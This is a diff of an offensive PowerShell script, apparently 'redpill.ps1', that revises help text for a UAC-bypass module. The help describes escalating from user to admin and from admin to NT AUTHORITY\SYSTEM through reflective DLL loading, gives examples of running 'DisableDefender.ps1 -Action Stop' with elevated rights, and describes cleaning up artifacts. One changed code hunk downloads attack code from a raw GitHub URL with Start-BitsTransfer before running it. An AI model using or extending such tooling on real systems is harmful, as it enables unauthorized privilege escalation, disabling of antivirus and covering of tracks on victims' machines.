@@ -2552,14 +2552,18 @@ If($UacMe -ne "false"){
       using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
       and elevate privileges { user -> admin } or to exec one command with admin privs!
 
+   .NOTES
+      If executed with administrator privileges and the 'Elevate' @argument its sellected,
+      then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!
+
    .Parameter UacMe
-      Accepts arguments: Bypass, Elevate OR Clean
+      Accepts arguments: Bypass, Elevate, Clean
 
    .Parameter Execute
-      Accepts the command\appl to be executed! (cmd|powershell)
+      Accepts the command OR application absoluct path to be executed!
 
    .Parameter Date
-      Delete artifacts left behind by is 'CreationDate'
+      Delete artifacts left behind by is 'CreationTime' (default: today)
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -UacMe bypass -Execute "regedit.exe"
@@ -2588,7 +2592,7 @@ If($UacMe -ne "false"){
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -UacMe Clean -Date "19/04/2021"
-      Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
+      Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'
 
    .OUTPUTS
       Payload file written to C:\Windows\Temp\455pj4k3.inf
@@ -2612,7 +2616,7 @@ If($UacMe -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1 -Destination $Env:TMP\UacMe.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 19){## Corrupted download detected => DefaultFileSize: 19,3212890625/KB
+      If($SizeDump -lt 21){## Corrupted download detected => DefaultFileSize: 21,8359375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -4193,14 +4197,18 @@ $HelpParameters = @"
       using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
       and elevate privileges { user -> admin } or to exec one command with admin privs!
 
+   .NOTES
+      If executed with administrator privileges and the 'Elevate' @argument its sellected,
+      then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!
+
    .Parameter UacMe
-      Accepts arguments: Bypass, Elevate OR Clean
+      Accepts arguments: Bypass, Elevate, Clean
 
    .Parameter Execute
-      Accepts the command\appl to be executed! (cmd|powershell)
+      Accepts the command OR application absoluct path to be executed!
 
    .Parameter Date
-      Delete artifacts left behind by is 'CreationDate'
+      Delete artifacts left behind by is 'CreationTime' (default: today)
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -UacMe bypass -Execute "regedit.exe"
@@ -4212,11 +4220,7 @@ $HelpParameters = @"
    
    .EXAMPLE
       PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell.exe"
-      Local spawns an powershell prompt with administrator privileges!   
-
-   .EXAMPLE
-      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file `$Env:TMP\redpill.ps1"
-      Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
+      Local spawns an powershell prompt with administrator privileges!
    
    .EXAMPLE
       PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file `$Env:TMP\DisableDefender.ps1 -Action Stop"
@@ -4229,7 +4233,7 @@ $HelpParameters = @"
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -UacMe Clean -Date "19/04/2021"
-      Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
+      Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'
 
    .OUTPUTS
       Payload file written to C:\Windows\Temp\455pj4k3.inf
@@ -4245,7 +4249,7 @@ $HelpParameters = @"
       UAC State     : Enabled
       UAC Settings  : Notify Me
       ReflectionDll : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
-      Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
+      Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
    #>!bye..
 
 "@;
